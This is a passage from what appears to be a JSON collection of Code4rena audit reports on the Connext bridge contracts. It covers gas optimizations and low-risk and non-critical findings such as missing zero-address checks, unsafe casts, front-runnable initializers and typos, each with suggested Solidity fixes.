selectorIndex++) {\ncore/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) {\ncore/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) {\n```\n\n### Recommendation\nIt is recommended to use prefix increment instead of postfix one when the return value is not needed, as both of them will give the same result and prefix increment costs less gas. \n\nFor example :\n```\ncore/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; ++i) {\n```\n---\n\n## Don't use long revert strings\n\nShortening revert strings to fit in 32 bytes will decrease gas costs for deployment and gas costs when the revert condition has been met.\n\n### Instances includes :\n```\ncore/connext/helpers/OZERC20.sol:185:    require(_sender != address(0), \"ERC20: transfer from the zero address\");\ncore/connext/helpers/OZERC20.sol:186:    require(_recipient != address(0), \"ERC20: transfer to the zero address\");\ncore/connext/helpers/OZERC20.sol:205:    require(_account != address(0), \"ERC20: mint to the zero address\");\ncore/connext/helpers/OZERC20.sol:226:    require(_account != address(0), \"ERC20: burn from the zero address\");\ncore/connext/helpers/OZERC20.sol:253:    require(_owner != address(0), \"ERC20: approve from the zero address\");\ncore/connext/helpers/OZERC20.sol:254:    require(_spender != address(0), \"ERC20: approve to the zero address\");\ncore/connext/libraries/LibDiamond.sol:66:    require(msg.sender == diamondStorage().contractOwner, \"LibDiamond: Must be contract owner\");\ncore/connext/libraries/LibDiamond.sol:121:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:123:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\");\ncore/connext/libraries/LibDiamond.sol:132:      require(oldFacetAddress == address(0), \"LibDiamondCut: Can't add function that already exists\");\ncore/connext/libraries/LibDiamond.sol:139:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:141:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\");\ncore/connext/libraries/LibDiamond.sol:150:      require(oldFacetAddress != _facetAddress, \"LibDiamondCut: Can't replace function with same function\");\ncore/connext/libraries/LibDiamond.sol:158:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:161:    require(_facetAddress == address(0), \"LibDiamondCut: Remove facet address must be address(0)\");\ncore/connext/libraries/LibDiamond.sol:191:    require(_facetAddress != address(0), \"LibDiamondCut: Can't remove function that doesn't exist\");\ncore/connext/libraries/LibDiamond.sol:193:    require(_facetAddress != address(this), \"LibDiamondCut: Can't remove immutable function\");\ncore/connext/libraries/LibDiamond.sol:224:      require(_calldata.length == 0, \"LibDiamondCut: _init is address(0) but_calldata is not empty\");\ncore/connext/libraries/LibDiamond.sol:226:      require(_calldata.length > 0, \"LibDiamondCut: _calldata is empty but _init is not address(0)\");\ncore/connext/libraries/SwapUtils.sol:784:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\");\ncore/connext/libraries/SwapUtils.sol:823:    require(amounts.length == pooledTokens.length, \"Amounts must match pooled tokens\");\ncore/connext/libraries/SwapUtils.sol:917:    require(minAmounts.length == pooledTokens.length, \"minAmounts must match poolTokens\");\n```\n\n### Recommendation\nIt is recommended to use error code and providing a reference to the error code instead of a long revert string., for example :\n```\n// Link to the reference of error codes\ncore/connext/libraries/SwapUtils.sol:917:    require(minAmounts.length == pooledTokens.length, \"ERR\");\n```\n---",
    "dataSource": {
      "name": "code-423n4/2022-06-connext-findings",
      "repo": "https://github.com/code-423n4/2022-06-connext-findings",
      "url": "https://github.com/code-423n4/2022-06-connext-findings/issues/274"
    }
  },
  {
    "title": "QA Report",
    "body": "### 1) Description of AssetLogic._swapAsset lacks one input argument\n\nAssetLogic._swapAsset() description has no mention of the _slippageTol argument:\n\n```\n  /**\n   * @notice Swaps assetIn t assetOut using the stored stable swap or internal swap pool\n   * @dev Will not swap if the asset passed in is the adopted asset\n   * @param _canonicalId - The canonical token id\n   * @param _assetIn - The address of the from asset\n   * @param _assetOut - The address of the to asset\n   * @param _amount - The amount of the local asset to swap\n   * @return The amount of assetOut\n   * @return The address of assetOut\n   */\n  function _swapAsset(\n    bytes32 _canonicalId,\n    address _assetIn,\n    address _assetOut,\n    uint256 _amount,\n    uint256 _slippageTol\n  ) internal returns (uint256, address) {\n```\n\n## Recommended Mitigation Steps\n\nAs an example:\n\n```solidity\n  /**\n   * @param _amount      - The amount of the local asset to swap\n   * @param _slippageTol - Slippage tolerance\n   * @return The amount of assetOut\n   */\n```\n\n### 2) Description of AssetLogic._swapAssetOut lacks one output argument\n\nThe success return value is omitted:\n\n```\n  /**\n   * @notice Swaps assetIn t assetOut using the stored stable swap or internal swap pool\n   * @dev Will not swap if the asset passed in is the adopted asset\n   * @param _canonicalId - The canonical token id\n   * @param _assetIn - The address of the from asset\n   * @param _assetOut - The address of the to asset\n   * @param _amountOut - The amount of the _assetOut to swap\n   * @return The amount of assetIn\n   * @return The address of assetOut\n   */\n  function _swapAssetOut(\n```\n\n## Recommended Mitigation Steps\n\nAs an example:\n\n```\n* @return Success value\n* @return The amount of assetIn\n```\n\n### 3) Open TODOs in BridgeFacet\n\nOpen TODO comments that require some decisions to be made and then code completion:\n\n```\n    // TODO: Should we call approve(0) and approve(totalRepayAmount) instead? or with a try catch to not affect gas on all cases?\n    // Example: https://github.com/aave/aave-v3-periphery/blob/ca184e5278bcbc10d28c3dbbc604041d7cfac50b/contracts/adapters/paraswap/ParaSwapRepayAdapter.sol#L138-L140\n    SafeERC20.safeIncreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount);\n```\n\nAlso:\n\n```\n      // TODO: do we need to keep this\n      bytes32 details = action.detailsHash();\n      IBridgeToken(token).setDetailsHash(details);\n```\n\n## Recommended Mitigation Steps\n\nConsider removing all TODO comments with the corresponding code amendments (i.e. fix, won't fix, etc) before release as they are relevant to the development process only.\n",
    "dataSource": {
      "name": "code-423n4/2022-06-connext-findings",
      "repo": "https://github.com/code-423n4/2022-06-connext-findings",
      "url": "https://github.com/code-423n4/2022-06-connext-findings/issues/271"
    }
  },
  {
    "title": "QA Report",
    "body": "**Overview**\n\nRisk Rating | Number of issues\n--- | ---\nLow Risk | 17\nNon-Critical Risk | 9\n\n**Table of Contents**\n\n- [Low Risk Issues](#low-risk-issues)\n  - [1. Check that `_sponsorVault` is a contract](#1-check-that-_sponsorvault-is-a-contract)\n  - [2. `al`, `fee` and `adminFee` cannot be set the their maximum value](#2-al-fee-and-adminfee-cannot-be-set-the-their-maximum-value)\n  - [3. Add constructor initializers](#3-add-constructor-initializers)\n  - [4. Unsafe casting may overflow](#4-unsafe-casting-may-overflow)\n  - [5. Uninitialized Upgradeable contract](#5-uninitialized-upgradeable-contract)\n  - [6. Deprecated safeApprove() function](#6-deprecated-safeapprove-function)\n  - [7. Missing address(0) checks](#7-missing-address0-checks)\n  - [8. Misleading comment](#8-misleading-comment)\n  - [9. Add a timelock to critical functions](#9-add-a-timelock-to-critical-functions)\n  - [10. `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#10-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256)\n  - [11. Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions](#11-upgradeable-contract-is-missing-a-__gap50-storage-variable-to-allow-for-new-storage-variables-in-later-versions)\n  - [12. All `initialize()` functions are front-runnable in the solution](#12-all-initialize-functions-are-front-runnable-in-the-solution)\n  - [13. Use the same revert string for consistency when testing the same condition](#13-use-the-same-revert-string-for-consistency-when-testing-the-same-condition)\n  - [14. Use a `constant` instead of duplicating the same string](#14-use-a-constant-instead-of-duplicating-the-same-string)\n  - [15. Use a 2-step ownership transfer pattern](#15-use-a-2-step-ownership-transfer-pattern)\n  - [16. A magic number should be documented and explained. Use a `constant` instead](#16-a-magic-number-should-be-documented-and-explained-use-a-constant-instead)\n  - [17. Lack of event emission for operation changing the state](#17-lack-of-event-emission-for-operation-changing-the-state)\n- [Non-Critical Issues](#non-critical-issues)\n  - [1. It's better to emit after all processing is done](#1-its-better-to-emit-after-all-processing-is-done)\n  - [2. The `nonReentrant` `modifier` should occur before all other modifiers](#2-the-nonreentrant-modifier-should-occur-before-all-other-modifiers)\n  - [3. Typos](#3-typos)\n  - [4. Deprecated library used for Solidity `>= 0.8` : SafeMath](#4-deprecated-library-used-for-solidity--08--safemath)\n  - [5. Open TODOS](#5-open-todos)\n  - [6. Adding a `return` statement when the function defines a named return variable, is redundant](#6-adding-a-return-statement-when-the-function-defines-a-named-return-variable-is-redundant)\n  - [7. The pragmas used are not the same everywhere](#7-the-pragmas-used-are-not-the-same-everywhere)\n  - [8. Non-library/interface files should use fixed compiler versions, not floating ones](#8-non-libraryinterface-files-should-use-fixed-compiler-versions-not-floating-ones)\n  - [9. Missing NatSpec](#9-missing-natspec)\n\n# Low Risk Issues\n\n## 1. Check that `_sponsorVault` is a contract\n\n`_sponsorVault` being an EOA instead of a contract can cause issues. Consider doing just like in [setExecutor()](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L244):\n\n- <https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L250-L256>\n\n```diff\nFile: BridgeFacet.sol\n250:   function setSponsorVault(address _sponsorVault) external onlyOwner {\n251:     address old = address(s.sponsorVault);\n- 252:     if (old == _sponsorVault) revert BridgeFacet__setSponsorVault_invalidSponsorVault();\n+ 252:     if (old == _sponsorVault || !Address.isContract(_sponsorVault)) revert BridgeFacet__setSponsorVault_invalidSponsorVault();\n253: \n254:     s.sponsorVault = ISponsorVault(_sponsorVault);\n255:     emit SponsorVaultUpdated(old, _sponsorVault, msg.sender);\n256:   }\n```\n\n## 2. `al`, `fee` and `adminFee` cannot be set the their maximum value\n\nConsider replacing `<` with `<=` [here](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/helpers/StableSwap.sol#L96):\n\n```solidity\nFile: StableSwap.sol\n96:     require(_a < AmplificationUtils.MAX_A, \"_a exceeds maximum\");\n```\n\n## 3. Add constructor initializers\n\nAs per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”\n\nNote that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”\n\nFurthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:\n\n```solidity\ncore/connext/helpers/BridgeToken.sol:34:  function initialize() public override initializer {\ncore/connext/helpers/LPToken.sol:21:  function initialize(string memory name, string memory symbol) external initializer returns (bool) {\ncore/connext/helpers/StableSwap.sol:61:  function initialize(\ncore/connext/helpers/TokenRegistry.sol:73:  function initialize(address _tokenBeacon, address _xAppConnectionManager) public initializer {\ncore/connext/interfaces/IBridgeToken.sol:5:  function initialize() external;\ncore/connext/interfaces/IStableSwap.sol:99:  function initialize(\ncore/promise/PromiseRouter.sol:146:  function initialize(address _xAppConnectionManager) public initializer {\ncore/relayer-fee/RelayerFeeRouter.sol:80:  function initialize(address _xAppConnectionManager) public initializer {\n```\n\n## 4. Unsafe casting may overflow\n\nSafeMath and Solidity 0.8.* handles overflows for basic math operations but not for casting.\nConsider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256 here:\n\n```solidity\ncore/connext/libraries/ConnextMessage.sol:49:    _view.assertType(uint40(_t));\ncore/connext/libraries/ConnextMessage.sol:71:    return actionType(_action) == uint8(_type) && messageType(_action) == _type;\ncore/connext/libraries/ConnextMessage.sol:138:      abi.encodePacked(Types.Transfer, _to, _amnt, _detailsHash, _transferId).ref(0).castTo(uint40(Types.Transfer));\ncore/connext/libraries/ConnextMessage.sol:157:    return abi.encodePacked(_domain, _id).ref(0).castTo(uint40(Types.TokenId));\ncore/connext/libraries/ConnextMessage.sol:188:      return _message.castTo(uint40(Types.Message));\ncore/connext/libraries/ConnextMessage.sol:201:    return Types(uint8(_view.typeOf()));\ncore/connext/libraries/ConnextMessage.sol:210:    return _message.slice(0, TOKEN_ID_LEN, uint40(Types.TokenId));\ncore/connext/libraries/ConnextMessage.sol:220:    uint40 _type = uint40(msgType(_message));\ncore/connext/libraries/ConnextMessage.sol:232:    return uint32(_tokenId.indexUint(0, 4));\ncore/connext/libraries/ConnextMessage.sol:263:    return uint8(_message.indexUint(TOKEN_ID_LEN, 1));\ncore/connext/libraries/ConnextMessage.sol:272:    return uint8(_action.indexUint(0, 1));\ncore/connext/libraries/Encoding.sol:37:      uint8 _b = uint8(_bytes >> (i * 8));\ncore/connext/libraries/Encoding.sol:46:        uint8 _b = uint8(_bytes >> (i * 8));\ncore/connext/libraries/Encoding.sol:62:    _char = uint8(NIBBLE_LOOKUP[_nibble]);\ncore/connext/libraries/LibCrossDomainProperty.sol:48:    _view.assertType(uint40(_t));\ncore/connext/libraries/LibCrossDomainProperty.sol:71:    return propertyType(_property) == uint8(_type);\ncore/connext/libraries/LibCrossDomainProperty.sol:89:    return uint8(_property.indexUint(0, 1));\ncore/connext/libraries/LibCrossDomainProperty.sol:99:      return _view.castTo(uint40(Types.DomainAndSender));\ncore/connext/libraries/LibCrossDomainProperty.sol:130:    return uint32(_property.indexUint(1, 4));\ncore/connext/libraries/LibCrossDomainProperty.sol:140:    return abi.encodePacked(Types.DomainAndSender, _domain, _sender).ref(0).castTo(uint40(Types.DomainAndSender));\ncore/connext/libraries/LibDiamond.sol:124:    uint96 selectorPosition = uint96(ds.facetFunctionSelectors[_facetAddress].functionSelectors.length);\ncore/connext/libraries/LibDiamond.sol:142:    uint96 selectorPosition = uint96(ds.facetFunctionSelectors[_facetAddress].functionSelectors.length);\ncore/connext/libraries/LibDiamond.sol:201:      ds.selectorToFacetAndPosition[lastSelector].functionSelectorPosition = uint96(selectorPosition);\ncore/promise/libraries/PromiseMessage.sol:41:    _view.assertType(uint40(_t));\ncore/promise/libraries/PromiseMessage.sol:63:        uint8(Types.PromiseCallback),\ncore/promise/libraries/PromiseMessage.sol:66:        uint8(_returnSuccess ? 1 : 0),\ncore/promise/libraries/PromiseMessage.sol:152:      return _view.castTo(uint40(Types.PromiseCallback));\ncore/promise/PromiseRouter.sol:313:    return (uint64(_origin) << 32) | _nonce;\ncore/relayer-fee/libraries/RelayerFeeMessage.sol:44:    _view.assertType(uint40(_t));\ncore/relayer-fee/libraries/RelayerFeeMessage.sol:57:    return abi.encodePacked(uint8(Types.ClaimFees), _recipient, _transferIds.length, _transferIds);\ncore/relayer-fee/libraries/RelayerFeeMessage.sol:109:      return _view.castTo(uint40(Types.ClaimFees));\ncore/relayer-fee/RelayerFeeRouter.sol:166:    return (uint64(_origin) << 32) | _nonce;\n```\n\n## 5. Uninitialized Upgradeable contract\n\n*Similar issue in the past: [here](https://github.com/code-423n4/2022-03-prepo-findings/issues/106)*\n\nUpgradeable dependencies should be initialized.\nWhile not causing any harm at the moment, suppose OZ someday decide to upgrade this contract and the sponsor uses the new version: it is possible that the contract will not work anymore.\nConsider calling the `init()` [here](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/promise/PromiseRouter.sol#L146-L148):\n\n```diff\nFile: PromiseRouter.sol\n23: contract PromiseRouter is Version, Router, ReentrancyGuardUpgradeable {\n...\n146:   function initialize(address _xAppConnectionManager) public initializer {\n147:     __XAppConnectionClient_initialize(_xAppConnectionManager);\n+ 147:     __ReentrancyGuard_init(); //@audit ReentrancyGuardUpgradeable\n148:   }\n```\n\nThis is already applied L72 in `StableSwap.sol` (but was forgotten in `PromiseRouter.sol`):\n\n```solidity\nFile: StableSwap.sol\n61:   function initialize(\n...\n70:   ) public override initializer {\n71:     __OwnerPausable_init();\n72:     __ReentrancyGuard_init();\n```\n\n## 6. Deprecated safeApprove() function\n\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45)\n\nUsing this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 `safeApprove()` function has been deprecated, as seen in the comments of the OpenZeppelin code.\n\nAs recommended by the OpenZeppelin comment, consider replacing `safeApprove()` with `safeIncreaseAllowance()` or `safeDecreaseAllowance()` instead:\n\n```solidity\ncore/connext/libraries/AssetLogic.sol:347:        SafeERC20.safeApprove(IERC20(_assetIn), address(pool), _amountIn);\n```\n\n## 7. Missing address(0) checks\n\nConsider adding an `address(0)` check for immutable variables:\n\n- File: Executor.sol\n\n```diff\n29:  address private immutable connext;\n...\n47:   constructor(address _connext) {\n+ 48:     require(_connext != address(0));\n48:     connext = _connext;\n49:   }\n```\n\n## 8. Misleading comment\n\n*Issue with comment*\n\nI suspect a copy-paste error [here](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/libraries/SwapUtils.sol#L790):\n\n```diff\n- core/connext/libraries/SwapUtils.sol:790:    require(dx <= maxDx, \"Swap didn't result in min tokens\");\n+ core/connext/libraries/SwapUtils.sol:790:    require(dx <= maxDx, \"Swap needs more than max tokens\");\n```\n\n## 9. Add a timelock to critical functions\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user).  \n\nConsider adding a timelock to:\n\n```solidity\ncore/connext/facets/StableSwapFacet.sol:469:  function setSwapAdminFee(bytes32 canonicalId, uint256 newAdminFee) external onlyOwner {\ncore/connext/facets/StableSwapFacet.sol:478:  function setSwapFee(bytes32 canonicalId, uint256 newSwapFee) external onlyOwner {\ncore/connext/helpers/StableSwap.sol:448:  function setAdminFee(uint256 newAdminFee) external onlyOwner {\ncore/connext/helpers/StableSwap.sol:456:  function setSwapFee(uint256 newSwapFee) external onlyOwner {\n```\n\n## 10. `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\n\n*Similar issue in the past: [here](https://github.com/code-423n4/2021-09-wildcredit-findings/issues/4)*\n\nUse `abi.encode()` instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` instead.\n\n```solidity\ncore/connext/helpers/BridgeToken.sol:134:    bytes32 _digest = keccak256(abi.encodePacked(_EIP712_PREFIX_AND_VERSION, domainSeparator(), _hashStruct));\ncore/connext/libraries/ConnextMessage.sol:178:    return keccak256(abi.encodePacked(bytes(_name).length, _name, bytes(_symbol).length, _symbol, _decimals));\n```\n\n## 11. Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions\n\nSee [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future:\n\n- LPToken.sol\n- OwnerPausableUpgradeable.sol\n\nThose contracts do apply the recommendation though:\n\n- ProposedOwnableUpgradeable.sol\n- BridgeToken.sol\n- ProposedOwnable.sol\n- Router.sol\n- XAppConnectionClient.sol\n\n## 12. All `initialize()` functions are front-runnable in the solution\n\nConsider adding some access control to them or deploying atomically or using constructor `initializer`:\n\n```solidity\ncore/connext/helpers/BridgeToken.sol:34:  function initialize() public override initializer {\ncore/connext/helpers/LPToken.sol:21:  function initialize(string memory name, string memory symbol) external initializer returns (bool) {\ncore/connext/helpers/StableSwap.sol:61:  function initialize(\ncore/connext/helpers/TokenRegistry.sol:73:  function initialize(address _tokenBeacon, address _xAppConnectionManager) public initializer {\ncore/connext/interfaces/IBridgeToken.sol:5:  function initialize() external;\ncore/connext/interfaces/IStableSwap.sol:99:  function initialize(\ncore/promise/PromiseRouter.sol:146:  function initialize(address _xAppConnectionManager) public initializer {\ncore/relayer-fee/RelayerFeeRouter.sol:80:  function initialize(address _xAppConnectionManager) public initializer {\n```\n\n## 13. Use the same revert string for consistency when testing the same condition\n\n*Issue with comment*\n\nConsider only using the shorter string:\n\n```solidity\ncore/connext/helpers/StableSwap.sol:155:    require(index < swapStorage.pooledTokens.length, \"Out of range\");\ncore/connext/helpers/StableSwap.sol:177:    require(index < swapStorage.pooledTokens.length, \"Index out of range\");\n```\n\n## 14. Use a `constant` instead of duplicating the same string\n\n*Issue with comment*\n\n```solidity\ncore/connext/libraries/LibDiamond.sol:123:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\");\ncore/connext/libraries/LibDiamond.sol:141:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\");\n```\n\n```solidity\ncore/connext/libraries/LibDiamond.sol:121:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:139:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:158:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\n```\n\n```solidity\ncore/connext/libraries/SwapUtils.sol:493:    require(tokenIndexFrom < xp.length && tokenIndexTo < xp.length, \"Token index out of range\");\ncore/connext/libraries/SwapUtils.sol:524:    require(tokenIndexFrom < xp.length && tokenIndexTo < xp.length, \"Token index out of range\");\n```\n\n```solidity\ncore/connext/libraries/SwapUtils.sol:662:    require(dy >= minDy, \"Swap didn't result in min tokens\");\ncore/connext/libraries/SwapUtils.sol:756:    require(dy >= minDy, \"Swap didn't result in min tokens\");\n```\n\n```solidity\ncore/connext/libraries/SwapUtils.sol:703:    require(dx <= maxDx, \"Swap needs more than max tokens\");\ncore/connext/libraries/SwapUtils.sol:790:    require(dx <= maxDx, \"Swap didn't result in min tokens\"); //@audit this one is a copy-paste error\n```\n\n```solidity\ncore/connext/libraries/SwapUtils.sol:697:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\");\ncore/connext/libraries/SwapUtils.sol:784:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\");\n```\n\n```solidity\ncore/connext/libraries/SwapUtils.sol:717:      require(dx <= tokenFrom.balanceOf(msg.sender), \"Cannot swap more than you own\");\ncore/connext/libraries/SwapUtils.sol:649:      require(dx <= tokenFrom.balanceOf(msg.sender), \"Cannot swap more than you own\");\ncore/connext/libraries/SwapUtils.sol:750:    require(dx <= tokenFrom.balanceOf(msg.sender), \"Cannot swap more than you own\");\n```\n\n```solidity\ncore/connext/libraries/SwapUtils.sol:1071:    require(newAdminFee <= MAX_ADMIN_FEE, \"Fee is too high\");\ncore/connext/libraries/SwapUtils.sol:1084:    require(newSwapFee <= MAX_SWAP_FEE, \"Fee is too high\");\n```\n\n## 15. Use a 2-step ownership transfer pattern\n\nContracts inheriting from OpenZeppelin's libraries have the default `transferOwnership()` function (a one-step process). It's possible that the `onlyOwner` role mistakenly transfers ownership to a wrong address, resulting in a loss of the `onlyOwner` role.\nConsider overriding the default `transferOwnership()` function to first nominate an address as the `pendingOwner` and implementing an `acceptOwnership()` function which is called by the `pendingOwner` to confirm the transfer.\n\n```solidity\ncore/connext/helpers/BridgeToken.sol:202:  function transferOwnership(address _newOwner) public override(IBridgeToken, OwnableUpgradeable) onlyOwner {\ncore/connext/helpers/BridgeToken.sol:203:    OwnableUpgradeable.transferOwnership(_newOwner);\ncore/connext/helpers/TokenRegistry.sol:302:    IBridgeToken(_token).transferOwnership(owner());\ncore/connext/interfaces/IBridgeToken.sol:29:  // inherited from ownable\ncore/connext/interfaces/IBridgeToken.sol:30:  function transferOwnership(address _newOwner) external;\n```\n\n## 16. A magic number should be documented and explained. Use a `constant` instead\n\n*Similar issue in the past: [here](https://github.com/code-423n4/2021-04-marginswap-findings/issues/71)*\n\n```solidity\ncore/connext/facets/upgrade-initializers/DiamondInit.sol:70:      s.nonce = 0;\ncore/connext/facets/upgrade-initializers/DiamondInit.sol:76:      s.LIQUIDITY_FEE_NUMERATOR = 9995;\ncore/connext/facets/upgrade-initializers/DiamondInit.sol:77:      s.LIQUIDITY_FEE_DENOMINATOR = 10000;\ncore/connext/facets/upgrade-initializers/DiamondInit.sol:78:      s.maxRoutersPerTransfer = 5;\ncore/connext/helpers/TokenRegistry.sol:300:    IBridgeToken(_token).setDetails(_name, _symbol, 18);\n```\n\nConsider using `constant` variables as this would make the code more maintainable and readable while costing nothing gas-wise (constants are replaced by their value at compile-time).\n\n## 17. Lack of event emission for operation changing the state\n\n```solidity\nFile: AssetFacet.sol\n171:   function removeAssetId(bytes32 _canonicalId, address _adoptedAssetId) external onlyOwner {\n...\n179:     delete s.adoptedToLocalPools[_canonicalId]; // @audit-info INFO no event emitted for StableSwap removal\n```\n\n# Non-Critical Issues\n\n## 1. It's better to emit after all processing is done\n\n- contracts/contracts/core/connext/facets/AssetFacet.sol:\n\n```solidity\n  152:     // Emit event\n  153:     emit AssetAdded(_canonical.id, _canonical.domain, _adoptedAssetId, supported, msg.sender);\n  154  \n  155      // Add the swap pool\n  156      _addStableSwapPool(_canonical, _stableSwapPool);\n  157    }\n```\n\n- contracts/contracts/core/connext/facets/RoutersFacet.sol:\n\n```solidity\n  303:     // Emit event\n  304:     emit RouterRemoved(router, msg.sender);\n  305  \n  306      // Remove router owner\n  307      address _owner = s.routerPermissionInfo.routerOwners[router];\n  308      if (_owner != address(0)) {\n  309:       emit RouterOwnerAccepted(router, _owner, address(0));\n  310        // delete routerOwners[router];\n  311        s.routerPermissionInfo.routerOwners[router] = address(0);\n  312      }\n```\n\n```solidity\n  316      if (_recipient != address(0)) {\n  317:       emit RouterRecipientSet(router, _recipient, address(0));\n  318        // delete routerRecipients[router];\n  319        s.routerPermissionInfo.routerRecipients[router] = address(0);\n  320      }\n```\n\n```solidity\n  335:     emit MaxRoutersPerTransferUpdated(_newMaxRouters, msg.sender);\n  336  \n  337      s.maxRoutersPerTransfer = _newMaxRouters;\n  338    }\n```\n\n- contracts/contracts/core/connext/helpers/ConnextPriceOracle.sol:\n\n```solidity\n  158    function setDirectPrice(address _token, uint256 _price) external onlyAdmin {\n  159:     emit DirectPriceUpdated(_token, assetPrices[_token], _price);\n  160      assetPrices[_token] = _price;\n  161    }\n```\n\n```solidity\n  163    function setV1PriceOracle(address _v1PriceOracle) external onlyAdmin {\n  164:     emit V1PriceOracleUpdated(v1PriceOracle, _v1PriceOracle);\n  165      v1PriceOracle = _v1PriceOracle;\n  166    }\n```\n\n- contracts/contracts/core/connext/helpers/SponsorVault.sol:\n\n```solidity\n  150:     emit RateUpdated(_originDomain, rates[_originDomain], _rate, msg.sender);\n  151  \n  152      rates[_originDomain] = _rate;\n  153    }\n```\n\n```solidity\n  159    function setRelayerFeeCap(uint256 _relayerFeeCap) external onlyOwner {\n  160:     emit RelayerFeeCapUpdated(relayerFeeCap, _relayerFeeCap, msg.sender);\n  161      relayerFeeCap = _relayerFeeCap;\n  162    }\n```\n\n```solidity\n  168    function setGasTokenOracle(address _gasTokenOracle) external onlyOwner {\n  169:     emit GasTokenOracleUpdated(address(gasTokenOracle), _gasTokenOracle, msg.sender);\n  170      gasTokenOracle = IGasTokenOracle(_gasTokenOracle);\n  171    }\n```\n\n```solidity\n  181:     emit TokenExchangeUpdated(_token, address(tokenExchanges[_token]), _tokenExchange, msg.sender);\n  182      tokenExchanges[_token] = ITokenExchange(_tokenExchange);\n  183    }\n```\n\n- contracts/contracts/core/connext/libraries/LibDiamond.sol:\n\n```solidity\n  116:     emit DiamondCut(_diamondCut, _init, _calldata);\n  117      initializeDiamondCut(_init, _calldata);\n  118    }\n```\n\n- contracts/contracts/core/promise/PromiseRouter.sol:\n\n```solidity\n  256:     emit CallbackExecuted(transferId, msg.sender);\n  257  \n  258      // Should transfer the stored relayer fee to the msg.sender\n  259      if (callbackFee > 0) {\n  260        AddressUpgradeable.sendValue(payable(msg.sender), callbackFee);\n```\n\n## 2. The `nonReentrant` `modifier` should occur before all other modifiers\n\nThis is a best-practice to protect against re-entrancy in other modifiers\n\n```solidity\ncore/connext/facets/BridgeFacet.sol:279:  function xcall(XCallArgs calldata _args) external payable whenNotPaused nonReentrant returns (bytes32) {\ncore/connext/facets/BridgeFacet.sol:411:  function execute(ExecuteArgs calldata _args) external whenNotPaused nonReentrant returns (bytes32) {\n```\n\n## 3. Typos\n\n- funciton\n\n```solidity\ncore/connext/facets/upgrade-initializers/DiamondInit.sol:31:// of your diamond. Add parameters to the init funciton if you need to.\n```\n\n- _potentialReplcia\n\n```solidity\ncore/connext/facets/BaseConnextFacet.sol:137:   * @notice Determine whether _potentialReplcia is an enrolled Replica from the xAppConnectionManager\n```\n\n- bridgable\n\n```solidity\ncore/connext/facets/BridgeFacet.sol:265:   * assets will be swapped for their local nomad asset counterparts (i.e. bridgable tokens) via the configured AMM if\n```\n\n- addressess\n\n```solidity\ncore/connext/facets/BridgeFacet.sol:774:      // Save the addressess of all routers providing 